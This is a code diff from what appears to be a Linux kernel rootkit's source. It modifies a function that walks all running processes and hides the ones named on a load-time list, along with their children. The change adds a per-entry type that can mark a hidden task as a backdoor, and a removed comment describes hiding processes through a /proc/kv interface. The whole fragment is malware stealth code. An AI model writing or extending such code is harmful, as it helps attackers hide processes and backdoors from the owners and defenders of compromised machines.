@@ -458,28 +458,15 @@ void kv_scan_and_hide(void) {
     struct task_struct *t;
 
     for_each_process(t) {
-
         short i = 0;
-        struct fs_file_node *fnode;
 
         if (kv_find_hidden_task(t)) continue;
-        if (!(fnode = fs_get_file_node(t))) continue;
-
-        for (; kv_hide_ps_on_load[i] != NULL; ++i) {
-            if (strncmp(kv_hide_ps_on_load[i], t->comm, strlen(kv_hide_ps_on_load[i]))) continue;
-            prinfo("Hide task name '%s' from '%s' of pid %d\n", t->comm, fnode->filename, t->pid);
-            /**
-             * notice that any netapp added here
-             * will NOT be killed if kv is unloaded
-             * In reality an application that is listed in kv_hide_ps_on_load will be handled
-             * in the same way as if you manually hide a parent process:
-             *  echo <pid of parent> >/proc/kv
-             */
-            kv_hide_task_by_pid(t->pid, 0 /* not a backdoor */, CHILDREN /* hide children */);
+        for (; kv_hide_ps_on_load[i].name != NULL; ++i) {
+            if (strncmp(kv_hide_ps_on_load[i].name, t->comm, strlen(kv_hide_ps_on_load[i].name))) continue;
+            prinfo("Hide task name '%s' of pid %d\n", t->comm, t->pid);
+            kv_hide_task_by_pid(t->pid, kv_hide_ps_on_load[i].type, CHILDREN);
             break;
         }
-
-        kfree(fnode);
     }
 }
 
